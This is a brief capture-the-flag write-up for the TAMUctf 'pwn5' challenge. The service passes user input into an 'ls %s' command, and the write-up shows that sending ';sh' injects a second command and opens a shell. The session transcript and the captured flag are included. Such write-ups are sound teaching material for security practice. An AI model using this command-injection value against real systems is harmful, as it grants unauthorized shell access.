## Pwn5 - Pwn

**Description:** ````nc pwn.tamuctf.com 4325````
**Challenge:** : pwn5
**Difficulty:** medium
**Solved by:** Neolex  

**Solution:**  
Here I used an unintended solution by just sending : ";sh" and we get a shell.
The issue here was that the input was print inside the string "ls %s" is the **run_cmd** function so if we stop the ls command with **;** and call sh command we get a shell :
```
$ nc pwn.tamuctf.com 4325
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
;sh
Result of ls ;sh:
flag.txt
pwn5
cat flag.txt
gigem{r37urn_0r13n73d_pr4c71c3}
```
**Flag:**  
gigem{r37urn_0r13n73d_pr4c71c3}

